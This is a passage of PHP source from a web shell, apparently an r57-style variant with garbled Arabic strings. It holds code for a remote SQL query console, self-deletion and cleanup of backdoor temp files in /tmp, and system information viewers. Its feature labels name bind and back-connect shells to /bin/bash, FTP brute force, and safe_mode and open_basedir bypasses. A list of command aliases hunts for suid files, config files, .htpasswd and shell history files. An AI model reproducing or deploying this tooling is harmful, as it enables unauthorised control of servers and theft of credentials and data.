 if(!$sql-&gt;connect()) echo "&lt;div align=center&gt;&lt;font face=tahoma size=-2 color=red&gt;&lt;b&gt;Can't connect to SQL server&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;";
  else
   {
   if(!empty($sql-&gt;base)&&!$sql-&gt;select_db()) echo "&lt;div align=center&gt;&lt;font face=tahoma size=-2 color=red&gt;&lt;b&gt;?? ?????? ????? ????? ????????&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;";
   else
    {
    foreach($querys as $num=&gt;$query)
     {
      if(strlen($query)&gt;5)
      {
      echo "&lt;font face=tahoma size=-2 color=green&gt;&lt;b&gt;Query#".$num." : ".htmlspecialchars($query,ENT_QUOTES)."&lt;/b&gt;&lt;/font&gt;&lt;br&gt;";
      switch($sql-&gt;query($query))
       {
       case '0':
       echo "&lt;table width=100%&gt;&lt;tr&gt;&lt;td&gt;&lt;font face=tahoma size=-2&gt;Error : &lt;b&gt;".$sql-&gt;error."&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
       break;
       case '1':
       if($sql-&gt;get_result())
        {
               echo "&lt;table width=100%&gt;";
        foreach($sql-&gt;columns as $k=&gt;$v) $sql-&gt;columns[$k] = htmlspecialchars($v,ENT_QUOTES);
               $keys = @implode("&nbsp;&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td bgcolor=#cccccc&gt;&lt;font face=tahoma size=-2&gt;&lt;b&gt;&nbsp;", $sql-&gt;columns);
        echo "&lt;tr&gt;&lt;td bgcolor=#333333&gt;&lt;font face=tahoma size=-2&gt;&lt;b&gt;&nbsp;".$keys."&nbsp;&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;";
        for($i=0;$i&lt;$sql-&gt;num_rows;$i++)
         {
         foreach($sql-&gt;rows[$i] as $k=&gt;$v) $sql-&gt;rows[$i][$k] = htmlspecialchars($v,ENT_QUOTES);
         $values = @implode("&nbsp;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;font face=tahoma size=-2&gt;&nbsp;",$sql-&gt;rows[$i]);
         echo '&lt;tr&gt;&lt;td&gt;&lt;font face=tahoma size=-2&gt;&nbsp;'.$values.'&nbsp;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;';
         }
        echo "&lt;/table&gt;";
        }
       break;
       case '2':
       $ar = $sql-&gt;affected_rows()?($sql-&gt;affected_rows()):('0');
       echo "&lt;table width=100%&gt;&lt;tr&gt;&lt;td&gt;&lt;font face=tahoma size=-2&gt;affected rows : &lt;b&gt;".$ar."&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;";
       break;
       }
      }
     }
    }
   }
 echo "&lt;br&gt;&lt;form name=form method=POST&gt;";
 echo in('hidden','db',0,$_POST['db']);
 echo in('hidden','db_server',0,$_POST['db_server']);
 echo in('hidden','db_port',0,$_POST['db_port']);
 echo in('hidden','mysql_l',0,$_POST['mysql_l']);
 echo in('hidden','mysql_p',0,$_POST['mysql_p']);
 echo in('hidden','mysql_db',0,$_POST['mysql_db']);
 echo in('hidden','cmd',0,'db_query');
 echo "&lt;div align=center&gt;";
 echo "&lt;font face=tahoma size=-2&gt;&lt;b&gt;Base: &lt;/b&gt;&lt;input type=text name=mysql_db value=\"".$sql-&gt;base."\"&gt;&lt;/font&gt;&lt;br&gt;";
 echo "&lt;textarea cols=65 rows=10 name=db_query&gt;".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;\nSELECT * FROM user;"))."&lt;/textarea&gt;&lt;br&gt;&lt;input type=submit name=submit value=\" Run SQL query \"&gt;&lt;/div&gt;&lt;br&gt;&lt;br&gt;";
 echo "&lt;/form&gt;";
 echo "&lt;br&gt;&lt;div align=center&gt;&lt;font face=tahoma size=-2&gt;&lt;b&gt;[ &lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt; ]&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;"; die();
 }
if(isset($_GET['delete']))
 {
   @unlink(__FILE__);
 }
if(isset($_GET['tmp']))
 {
   @unlink("/tmp/bdpl");
   @unlink("/tmp/back");
   @unlink("/tmp/bd");
   @unlink("/tmp/bd.c");
   @unlink("/tmp/dp");
   @unlink("/tmp/dpc");
   @unlink("/tmp/dpc.c");
 }
if(isset($_GET['phpini']))
{
echo $head;
function U_value($value)
 {
 if ($value == '') return '&lt;i&gt;no value&lt;/i&gt;';
 if (@is_bool($value)) return $value ? 'TRUE' : 'FALSE';
 if ($value === null) return 'NULL';
 if (@is_object($value)) $value = (array) $value;
 if (@is_array($value))
 {
 @ob_start();
 print_r($value);
 $value = @ob_get_contents();
 @ob_end_clean();
 }
 return U_wordwrap((string) $value);
 }
function U_wordwrap($str)
 {
 $str = @wordwrap(@htmlspecialchars($str), 100, '&lt;wbr /&gt;', true);
 return @preg_replace('!(&[^;]*)&lt;wbr /&gt;([^;]*;)!', '$1$2&lt;wbr /&gt;', $str);
 }
if (@function_exists('ini_get_all'))
 {
 $r = '';
 echo '&lt;table width=100%&gt;', '&lt;tr&gt;&lt;td bgcolor=#000000&gt;&lt;font face=tahoma size=-2 color=red&gt;&lt;div align=center&gt;&lt;b&gt;Directive&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;td bgcolor=#000000&gt;&lt;font face=tahoma size=-2 color=red&gt;&lt;div align=center&gt;&lt;b&gt;Local Value&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;td bgcolor=#000000&gt;&lt;font face=tahoma size=-2 color=red&gt;&lt;div align=center&gt;&lt;b&gt;Master Value&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;';
 foreach (@ini_get_all() as $key=&gt;$value)
  {
  $r .= '&lt;tr&gt;&lt;td&gt;'.ws(3).'&lt;font face=tahoma size=-2&gt;&lt;b&gt;'.$key.'&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;font face=tahoma size=-2&gt;&lt;div align=center&gt;&lt;b&gt;'.U_value($value['local_value']).'&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;font face=tahoma size=-2&gt;&lt;div align=center&gt;&lt;b&gt;'.U_value($value['global_value']).'&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;';
  }
 echo $r;
 echo '&lt;/table&gt;';
 }
echo "&lt;br&gt;&lt;div align=center&gt;&lt;font face=tahoma size=-2&gt;&lt;b&gt;[ &lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt; ]&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;";
die();
}
if(isset($_GET['cpu']))
 {
   echo $head;
   echo '&lt;table width=100%&gt;&lt;tr&gt;&lt;td bgcolor=#000000&gt;&lt;div align=center&gt;&lt;font face=tahoma size=-2 color=red&gt;&lt;b&gt;CPU&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;table width=100%&gt;';
   $cpuf = @file("cpuinfo");
   if($cpuf)
    {
      $c = @sizeof($cpuf);
      for($i=0;$i&lt;$c;$i++)
        {
          $info = @explode(":",$cpuf[$i]);
          if($info[1]==""){ $info[1]="---"; }
          $r .= '&lt;tr&gt;&lt;td&gt;'.ws(3).'&lt;font face=tahoma size=-2&gt;&lt;b&gt;'.trim($info[0]).'&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;font face=tahoma size=-2&gt;&lt;div align=center&gt;&lt;b&gt;'.trim($info[1]).'&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;';
        }
      echo $r;
    }
   else
    {
      echo '&lt;tr&gt;&lt;td&gt;'.ws(3).'&lt;div align=center&gt;&lt;font face=tahoma size=-2&gt;&lt;b&gt; --- &lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;';
    }
   echo '&lt;/table&gt;';
   echo "&lt;br&gt;&lt;div align=center&gt;&lt;font face=tahoma size=-2&gt;&lt;b&gt;[ &lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt; ]&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;";
   die();
 }
if(isset($_GET['mem']))
 {
   echo $head;
   echo '&lt;table width=100%&gt;&lt;tr&gt;&lt;td bgcolor=#000000&gt;&lt;div align=center&gt;&lt;font face=tahoma size=-2 color=red&gt;&lt;b&gt;MEMORY&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;table width=100%&gt;';
   $memf = @file("meminfo");
   if($memf)
    {
      $c = sizeof($memf);
      for($i=0;$i&lt;$c;$i++)
        {
          $info = explode(":",$memf[$i]);
          if($info[1]==""){ $info[1]="---"; }
          $r .= '&lt;tr&gt;&lt;td&gt;'.ws(3).'&lt;font face=tahoma size=-2&gt;&lt;b&gt;'.trim($info[0]).'&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;font face=tahoma size=-2&gt;&lt;div align=center&gt;&lt;b&gt;'.trim($info[1]).'&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;';
        }
      echo $r;
    }
   else
    {
      echo '&lt;tr&gt;&lt;td&gt;'.ws(3).'&lt;div align=center&gt;&lt;font face=tahoma size=-2&gt;&lt;b&gt; --- &lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;';
    }
   echo '&lt;/table&gt;';
   echo "&lt;br&gt;&lt;div align=center&gt;&lt;font face=tahoma size=-2&gt;&lt;b&gt;[ &lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt; ]&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;";
   die();
 }
$lang=array(
'eng_text1' =&gt;'Executed command',
'eng_text2' =&gt;'Execute command on server',
'eng_text3' =&gt;'Run command',
'eng_text4' =&gt;'Work directory',
'eng_text5' =&gt;'Upload files on server',
'eng_text6' =&gt;'Local file',
'eng_text7' =&gt;'Aliases',
'eng_text8' =&gt;'Select alias',
'eng_butt1' =&gt;'Execute',
'eng_butt2' =&gt;'Upload',
'eng_text9' =&gt;'Bind port to /bin/bash',
'eng_text10'=&gt;'Port',
'eng_text11'=&gt;'Password for access',
'eng_butt3' =&gt;'Bind',
'eng_text12'=&gt;'back-connect',
'eng_text13'=&gt;'IP',
'eng_text14'=&gt;'Port',
'eng_butt4' =&gt;'Connect',
'eng_text15'=&gt;'Upload files from remote server',
'eng_text16'=&gt;'With',
'eng_text17'=&gt;'Remote file',
'eng_text18'=&gt;'Local file',
'eng_text19'=&gt;'Exploits',
'eng_text20'=&gt;'Use',
'eng_text21'=&gt;'&nbsp;New name',
'eng_text22'=&gt;'datapipe',
'eng_text23'=&gt;'Local port',
'eng_text24'=&gt;'Remote host',
'eng_text25'=&gt;'Remote port',
'eng_text26'=&gt;'Use',
'eng_butt5' =&gt;'Run',
'eng_text28'=&gt;'Work in safe_mode',
'eng_text29'=&gt;'ACCESS DENIED',
'eng_butt6' =&gt;'Change',
'eng_text30'=&gt;'Cat file',
'eng_butt7' =&gt;'Show',
'eng_text31'=&gt;'File not found',
'eng_text32'=&gt;'Eval PHP code',
'eng_text33'=&gt;'Test bypass open_basedir with cURL functions',
'eng_butt8' =&gt;'Test',
'eng_text34'=&gt;'Test bypass safe_mode with include function',
'eng_text35'=&gt;'Test bypass safe_mode with load file in mysql',
'eng_text36'=&gt;'Database . Table',
'eng_text37'=&gt;'Login',
'eng_text38'=&gt;'Password',
'eng_text39'=&gt;'Database',
'eng_text40'=&gt;'Dump database table',
'eng_butt9' =&gt;'Dump',
'eng_text41'=&gt;'Save dump in file',
'eng_text42'=&gt;'Edit files',
'eng_text43'=&gt;'File for edit',
'eng_butt10'=&gt;'Save',
'eng_text44'=&gt;'Can\'t edit file! Only read access!',
'eng_text45'=&gt;'File saved',
'eng_text46'=&gt;'Show phpinfo()',
'eng_text47'=&gt;'Show variables from php.ini',
'eng_text48'=&gt;'Delete temp files',
'eng_butt11'=&gt;'Edit file',
'eng_text49'=&gt;'Delete script from server',
'eng_text50'=&gt;'View cpu info',
'eng_text51'=&gt;'View memory info',
'eng_text52'=&gt;'Find text',
'eng_text53'=&gt;'In dirs',
'eng_text54'=&gt;'Find text in files',
'eng_butt12'=&gt;'Find',
'eng_text55'=&gt;'Only in files',
'eng_text56'=&gt;'Nothing :(',
'eng_text57'=&gt;'Create/Delete File/Dir',
'eng_text58'=&gt;'name',
'eng_text59'=&gt;'file',
'eng_text60'=&gt;'dir',
'eng_butt13'=&gt;'Create/Delete',
'eng_text61'=&gt;'File created',
'eng_text62'=&gt;'Dir created',
'eng_text63'=&gt;'File deleted',
'eng_text64'=&gt;'Dir deleted',
'eng_butt65'=&gt;'Create',
'eng_text65'=&gt;'Create',
'eng_text66'=&gt;'Delete',
'eng_text67'=&gt;'Chown/Chgrp/Chmod',
'eng_text68'=&gt;'Command',
'eng_text69'=&gt;'param1',
'eng_text70'=&gt;'param2',
'eng_text71'=&gt;"Second commands param is:\r\n- for CHOWN - name of new owner or UID\r\n- for CHGRP - group name or GID\r\n- for CHMOD - 0777, 0755...",
'eng_text72'=&gt;'Text for find',
'eng_text73'=&gt;'Find in folder',
'eng_text74'=&gt;'Find in files',
'eng_text75'=&gt;'* you can use regexp',
'eng_text76'=&gt;'Search text in files via find',
'eng_text80'=&gt;'Type',
'eng_text81'=&gt;'Net',
'eng_text82'=&gt;'Databases',
'eng_text83'=&gt;'Run SQL query',
'eng_text84'=&gt;'SQL query',
'eng_text85'=&gt;'Test bypass safe_mode with commands execute via MSSQL server',
'eng_text86'=&gt;'Download files from server',
'eng_butt14'=&gt;'Download',
'eng_text87'=&gt;'Download files from remote ftp-server',
'eng_text88'=&gt;'FTP-server:port',
'eng_text89'=&gt;'File on ftp',
'eng_text90'=&gt;'Transfer mode',
'eng_text91'=&gt;'Archivation',
'eng_text92'=&gt;'without archivation',
'eng_text93'=&gt;'FTP',
'eng_text94'=&gt;'FTP-bruteforce',
'eng_text95'=&gt;'Users list',
'eng_text96'=&gt;'Can\'t get users list',
'eng_text97'=&gt;'checked: ',
'eng_text98'=&gt;'success: ',
'eng_text99'=&gt;'* use username from /etc/passwd for ftp login and password',
'eng_text100'=&gt;'Send file to remote ftp server',
'eng_text101'=&gt;'Use reverse (user -&gt; resu) login for password',
'eng_text102'=&gt;'Mail',
'eng_text103'=&gt;'Send email',
'eng_text104'=&gt;'Send file to email',
'eng_text105'=&gt;'To',
'eng_text106'=&gt;'From',
'eng_text107'=&gt;'Subj',
'eng_butt15'=&gt;'Send',
'eng_text108'=&gt;'Mail',
'eng_text109'=&gt;'Hide',
'eng_text110'=&gt;'Show',
'eng_text111'=&gt;'SQL-Server : Port',
'eng_text112'=&gt;'Test bypass safe_mode with function mb_send_mail',
'eng_text113'=&gt;'Test bypass safe_mode, view dir list via imap_list',
'eng_text114'=&gt;'Test bypass safe_mode, view file contest via imap_body',
'eng_text115'=&gt;'Test bypass safe_mode, copy file via compress.zlib:// in function copy()',
'eng_text116'=&gt;'Copy from',
'eng_text117'=&gt;'to',
'eng_text118'=&gt;'File copied',
'eng_text119'=&gt;'Cant copy file',
'eng_err0'=&gt;'Error! Can\'t write in file ',
'eng_err1'=&gt;'Error! Can\'t read file ',
'eng_err2'=&gt;'Error! Can\'t create ',
'eng_err3'=&gt;'Error! Can\'t connect to ftp',
'eng_err4'=&gt;'Error! Can\'t login on ftp server',
'eng_err5'=&gt;'Error! Can\'t change dir on ftp',
'eng_err6'=&gt;'Error! Can\'t sent mail',
'eng_err7'=&gt;'Mail send',
'eng_text200'=&gt;'read file from vul copy()',
'eng_text202'=&gt;'where file in server',
'eng_text300'=&gt;'read file from vul curl()',
'eng_text203'=&gt;'read file from vul ini_restore()',
'eng_text204'=&gt;'write shell from vul error_log()',
'eng_text205'=&gt;'write shell in this side',
'eng_text206'=&gt;'read dir',
'eng_text207'=&gt;'read dir from vul reg_glob',
'eng_text208'=&gt;'execute with function',
'eng_text209'=&gt;'read dir from vul root',
'eng_text210'=&gt;'DeZender ',
'eng_text211'=&gt;'::safe_mode off::',
'eng_text212'=&gt;'colse safe_mode with php.ini',
'eng_text213'=&gt;'colse security_mod with .htaccess',
'eng_text214'=&gt;'Admin name',
'eng_text215'=&gt;'IRC server ',
'eng_text216'=&gt;'#room name',
'eng_text217'=&gt;'server',
'eng_text218'=&gt;'write ini.php file to close safe_mode with ini_restore vul',
'eng_text219'=&gt;'Get file to server in safe_mode and change name',
'eng_text220'=&gt;'show file with symlink vul',
'eng_text221'=&gt;'zip file in server to download',
'ar_text222'=&gt;'2 symlink use vul',
'ar_text223'=&gt;'read file from funcution',
'ar_text224'=&gt;'read file from PLUGIN ',
/* --------------------------------------------------------------- */
'ar_text1' =&gt;'????? ??????',
'ar_text2' =&gt;'????? ??????? ?? ???????',
'ar_text3' =&gt;'??? ???????',
'ar_text4' =&gt;'???? ???? ???? ??? ???????',
'ar_text5' =&gt;'??? ??? ??? ???????',
'ar_text6' =&gt;'???? ????',
'ar_text7' =&gt;'????? ?????',
'ar_text8' =&gt;'???? ?????',
'ar_butt1' =&gt;'?????',
'ar_butt2' =&gt;'????',
'ar_text9' =&gt;'??? ???? ?? ??????? ??? /bin/bash',
'ar_text10'=&gt;'?????',
'ar_text11'=&gt;'?????? ??????',
'ar_butt3' =&gt;'???',
'ar_text12'=&gt;'?????? ?????',
'ar_text13'=&gt;'???? ??',
'ar_text14'=&gt;'??????',
'ar_butt4' =&gt;'??????',
'ar_text15'=&gt;'??? ????? ??? ???????',
'ar_text16'=&gt;'?? ????',
'ar_text17'=&gt;'???? ?????',
'ar_text18'=&gt;'???? ?????',
'ar_text19'=&gt;'Exploits',
'ar_text20'=&gt;'??????',
'ar_text21'=&gt;'????? ??????',
'ar_text22'=&gt;'????? ????????',
'ar_text23'=&gt;'?????? ??????',
'ar_text24'=&gt;'??????? ??????',
'ar_text25'=&gt;'?????? ??????',
'ar_text26'=&gt;'??????',
'ar_butt5' =&gt;'?????',
'ar_text28'=&gt;'????? ?? ????? ?????',
'ar_text29'=&gt;'????? ??????',
'ar_butt6' =&gt;'????',
'ar_text30'=&gt;'??? ???',
'ar_butt7' =&gt;'???',
'ar_text31'=&gt;'????? ??? ?????',
'ar_text32'=&gt;'????? ??? php ?? ???? ???? eval',
'ar_text33'=&gt;'Test bypass open_basedir with cURL functions',
'ar_butt8' =&gt;'??????',
'ar_text34'=&gt;'????? ??????? ?? ???? ???? include',
'ar_text35'=&gt;'????? ??????? ?? ???? ???? Mysql',
'ar_text36'=&gt;'??????? . ??????',
'ar_text37'=&gt;'??? ????????',
'ar_text38'=&gt;'???? ??????',
'ar_text39'=&gt;'???????',
'ar_text40'=&gt;'???? ?? ????? ???????',
'ar_butt9' =&gt;'????',
'ar_text41'=&gt;'??? ?????? ??',
'ar_text42'=&gt;'????? ???????',
'ar_text43'=&gt;'????? ?????? ??????',
'ar_butt10'=&gt;'???',
'ar_text44'=&gt;'???????? ??????? ??? ??? ????? ??? ????',
'ar_text45'=&gt;'?? ?????',
'ar_text46'=&gt;'??? phpinfo()',
'ar_text47'=&gt;'???? ????????? ?? php.ini',
'ar_text48'=&gt;'??? ????? ??? temp',
'ar_butt11'=&gt;'????? ?????',
'ar_text49'=&gt;'??? ??????? ?? ???????',
'ar_text50'=&gt;'??? ??????? ??????? ????????',
'ar_text51'=&gt;'??? ??????? ???????',
'ar_text52'=&gt;'??? ??',
'ar_text53'=&gt;'?? ??????',
'ar_text54'=&gt;'??? ?? ?? ?? ???????',
'ar_butt12'=&gt;'???',
'ar_text55'=&gt;'??? ?? ???????',
'ar_text56'=&gt;'?????? :(',
'ar_text57'=&gt;'?????/??? ???/????',
'ar_text58'=&gt;'?????',
'ar_text59'=&gt;'???',
'ar_text60'=&gt;'????',
'ar_butt13'=&gt;'????? /???',
'ar_text61'=&gt;'?? ????? ?????',
'ar_text62'=&gt;'?? ????? ??????',
'ar_text63'=&gt;'?? ??? ?????',
'ar_text64'=&gt;'?? ??? ??????',
'ar_butt65'=&gt;'?????',
'ar_text66'=&gt;'???',
'ar_text67'=&gt;'???????/????????/????????',
'ar_text68'=&gt;'???',
'ar_text69'=&gt;'??? ?????',
'ar_text70'=&gt;'???????',
'ar_text71'=&gt;"Second commands param is:\r\n- for CHOWN - name of new owner or UID\r\n- for CHGRP - group name or GID\r\n- for CHMOD - 0777, 0755...",
'ar_text72'=&gt;'???? ??????',
'ar_text73'=&gt;'??? ?? ????????',
'ar_text74'=&gt;'??? ?? ???????',
'ar_text75'=&gt;'* you can use regexp',
'ar_text76'=&gt;'????? ?? ?? ?? ????? ?????? find',
'ar_text80'=&gt;'?????',
'ar_text81'=&gt;'?????????',
'ar_text82'=&gt;'????? ????????',
'ar_text83'=&gt;'????? ??? ???????',
'ar_text84'=&gt;'??????? ?????',
'ar_text85'=&gt;'Test bypass safe_mode with commands execute via MSSQL server',
'ar_text86'=&gt;'????? ????? ?? ???????',
'ar_butt14'=&gt;'?????',
'ar_text87'=&gt;'????? ????? ?? ???? ???? ?? ??',
'ar_text88'=&gt;'????? ???? ?? ??:??????',
'ar_text89'=&gt;'??? ?? ???? ?? ??',
'ar_text90'=&gt;'??????? ???',
'ar_text91'=&gt;'?????',
'ar_text92'=&gt;'?? ??? ???????',
'ar_text93'=&gt;'???? ?? ??',
'ar_text94'=&gt;'????? ???? ?? ??',
'ar_text95'=&gt;'????? ??????????',
'ar_text96'=&gt;'?? ????? ??? ????? ??????????',
'ar_text97'=&gt;'?? ?????: ',
'ar_text98'=&gt;'?? ?????: ',
'ar_text99'=&gt;'* ?????? ????? ?????????? ?? ??? /etc/passwd ????? ??? ftp',
'ar_text100'=&gt;'????? ??? ??? ???? ???? ?? ??',
'ar_text101'=&gt;'?????? ??????? ?????? ????????',
'ar_text102'=&gt;'????? ??????',
'ar_text103'=&gt;'????? ????',
'ar_text104'=&gt;'????? ??? ??? ???????',
'ar_text105'=&gt;'???',
'ar_text106'=&gt;'???',
'ar_text107'=&gt;'???????',
'ar_butt15'=&gt;'?????',
'ar_text108'=&gt;'???????',
'ar_text109'=&gt;'????',
'ar_text110'=&gt;'???',
'ar_text111'=&gt;'????? ????? ???????? : ??????',
'ar_text112'=&gt;'????? ??????? ?? ???? ???? ???? mb_send_mail',
'ar_text113'=&gt;'????? ????? ???????? ?? ???? via imap_list',
'ar_text114'=&gt;'????? ??????? ?? ???? ???? via imap_body',
'ar_text115'=&gt;'????? ??????? ?? ???? compress.zlib://',
'ar_text116'=&gt;'??? ??',
'ar_text117'=&gt;'???',
'ar_text118'=&gt;'?? ??? ?????',
'ar_text119'=&gt;'???????? ?????',
'ar_err0'=&gt;'???? ! ?????? ??????? ??? ??? ????? ',
'ar_err1'=&gt;'???? ! ??? ???? ??? ????? ??? ????? ',
'ar_err2'=&gt;'????! ?????? ??????? ',
'ar_err3'=&gt;'????! ??? ???? ??? ??????? ????? ?? ??',
'ar_err4'=&gt;'???? ! ???????? ?????? ??? ????? ???? ?? ??',
'ar_err5'=&gt;'???? ! ???????? ???? ?????? ?? ???? ?? ??',
'ar_err6'=&gt;'???? ! ???????? ????? ?????',
'ar_err7'=&gt;'?????? ????',
'ar_text200'=&gt;'copy()????? ??????? ?? ???? ????',
'ar_text202'=&gt;'???? ????? ?????? ??????',
'ar_text300'=&gt;'curl()????? ??????? ?? ???? ????',
'ar_text203'=&gt;'ini_restore()????? ??????? ?? ???? ????',
'ar_text204'=&gt;'error_log()????? ??????? ?? ???? ????',
'ar_text205'=&gt;'???? ???? ??? ??? ??????',
'ar_text206'=&gt;'????? ??????? ??????',
'ar_text207'=&gt;'????? ??????? ???????? ?? ???? ???? reg_glob',
'ar_text208'=&gt;'????? ??????? ?? ????? ????? ?? ???? ??????',
'ar_text209'=&gt;'????? ??????? ???????? ?? ???? ???? root',
'ar_text210'=&gt;'?? ????? ????? ',
'ar_text211'=&gt;'::????? ????? ???::',
'ar_text212'=&gt;'php.ini ????? ????? ??? ?? ???? ??? ???',
'ar_text213'=&gt;'htacces ????? ????? ??????? ?? ???? ??? ???',
'ar_text214'=&gt;'??? ??????',
'ar_text215'=&gt;'????? ??????? IRC ',
'ar_text216'=&gt;'# ??? ?????? ??',
'ar_text217'=&gt;'??? ??????? ???????',
'ar_text218'=&gt;'?????? ????? ??? ini_restore ??? ??? ????? ??? ????',
'ar_text219'=&gt;'??? ????? ??? ??????? ????? ????? ?????? ?????',
'ar_text220'=&gt;'??????? ??????? ?? ???? ???? symlink ?????? ??????',
'ar_text221'=&gt;'??? ??????? ???????? ?? ??????(??? ??????? ?????? ??? ?????? ????? ???????? ??????)1',
'ar_text222'=&gt;'??????? ??????? ?? ???? ???? symlink ?????? ???????',
'ar_text223'=&gt;'????? ??????? ?? ???? ??????',
'ar_text224'=&gt;'PLUGIN ????? ??????? ?? ???? ???? ',
);
/*
?????? ??????
????????? ???????? ????????????? ?????? ????? ? ???-?? ??????. ( ??????? ????????? ???? ????????? ???? )
?? ?????? ???? ????????? ??? ???????? ???????.
*/
$aliases=array(
'????? ?? ????? suid'=&gt;'find / -type f -perm -04000 -ls',
'????? ?? ????? suid ?? ?????? ??????'=&gt;'find . -type f -perm -04000 -ls',
'????? ?? ????? suid'=&gt;'find / -type f -perm -02000 -ls',
'????? ?? ????? suid ?? ?????? ??????'=&gt;'find . -type f -perm -02000 -ls',
'????? ?? ????? config.inc.php'=&gt;'find / -type f -name config.inc.php',
'????? ?? ????? config.inc.php ?? ?????? ??????'=&gt;'find . -type f -name config.inc.php',
'????? ?? ????? config* ????? ??????????'=&gt;'find / -type f -name "config*"',
'????? ?? ????? config* ?? ?????? ??????'=&gt;'find . -type f -name "config*"',
'????? ?? ??????? ??????? ???????'=&gt;'find / -type f -perm -2 -ls',
'????? ?? ??????? ??????? ??????? ?? ?????? ??????'=&gt;'find . -type f -perm -2 -ls',
'????? ?? ???????? ??????? ???????'=&gt;'find /  -type d -perm -2 -ls',
'????? ?? ???????? ??????? ??????? ?? ?????? ??????'=&gt;'find . -type d -perm -2 -ls',
'????? ?? ????? ??????? ????? ???????'=&gt;'find / -perm -2 -ls',
'????? ?? ????? ??????? ?? ?????? ??????'=&gt;'find . -perm -2 -ls',
'????? ?? ????? service.pwd'=&gt;'find / -type f -name service.pwd',
'????? ?? ????? service.pwd ?? ?????? ??????'=&gt;'find . -type f -name service.pwd',
'????? ?? ?? ????? ??????? ??????? .htpasswd'=&gt;'find / -type f -name .htpasswd',
'????? ?? ???? ????? ??????? ??????? ?? ?????? ??????'=&gt;'find . -type f -name .htpasswd',
'????? ?? ???? ????? .bash_history'=&gt;'find / -type f -name .bash_history',
'????? ?? ???? ????? .bash_history ?? ?????? ??????'=&gt;'find . -type f -name .bash_history',
'????? ?? ???? ????? .mysql_history'=&gt;'find / -type f -name .mysql_history',
'????? ?? ???? ????? .mysql_history ?? ?????? ??????'=&gt;'find . -type f -name .mysql_history',
'????? ?? ???? ????? .fetchmailrc'=&gt;'find / -type f -name .fetchmailrc',
'????? ?? ???? ????? .fetchmailrc ?? ?????? ??????'=&gt;'find . -type f -name .fetchmailrc',
'??? ????? ????? ?? ??????'=&gt;'lsattr -va',
'???? ???????? ???????? ?? ???????'=&gt;'netstat -an | grep -i listen',
'???? ???? ???????? ???????? ???????'=&gt;'cat /etc/fstab',
'?????? ??? ????? ????? ???? ???? ???????? ??? ???????'=&gt;'cat /var/cpanel/accounting.log',
'?????? ???????? ???? ???? ???? ???????'=&gt;'ps aux',
'?????????? ???????? ?????'=&gt;'w',
'??? ???????? ?????'=&gt;'lastlog',
'??? ????? ????? wget curl ..etc'=&gt;'which wget curl w3m lynx',
'??? ???? ??????? gcc'=&gt;'locate gcc',

'----------------------------------------------------------------------------------------------------'=&gt;'ls -la'
);
$table_up1  = "&lt;tr&gt;&lt;td bgcolor=#272727&gt;&lt;font face=tahoma size=-2&gt;&lt;b&gt;&lt;div align=center&gt;:: ";
$table_up2  = " ::&lt;/div&gt;&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;";
$table_up3  = "&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#cccccc&gt;&lt;tr&gt;&lt;td bgcolor=#333333&gt;";
$table_end1 = "&lt;/td&gt;&lt;/tr&gt;";
$arrow = " &lt;font face=Webdings color=gray&gt;4&lt;/font&gt;";
$lb = "&lt;font color=black&gt;[&lt;/font&gt;";
$rb = "&lt;font color=black&gt;]&lt;/font&gt;";
$font = "&lt;font face=tahoma size=-2&gt;";
$ts = "&lt;table class=table1 width=100% align=center&gt;";
$te = "&lt;/table&gt;";
$fs = "&lt;form name=form method=POST&gt;";
$fe = "&lt;/form&gt;";
if(isset($_GET['users']))
 {
 if(!$users=get_users()) { echo "&lt;center&gt;&lt;font face=tahoma size=-2 color=red&gt;".$lang[$language.'_text96']."&lt;/font&gt;&lt;/center&gt;"; }
 else
  {
  echo '&lt;center&gt;';
  foreach($users as $user) { echo $user."&lt;br&gt;"; }
  echo '&lt;/center&gt;';
  }
 echo "&lt;br&gt;&lt;div align=center&gt;&lt;font face=tahoma size=-2&gt;&lt;b&gt;[ &lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt; ]&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;"; die();
 }
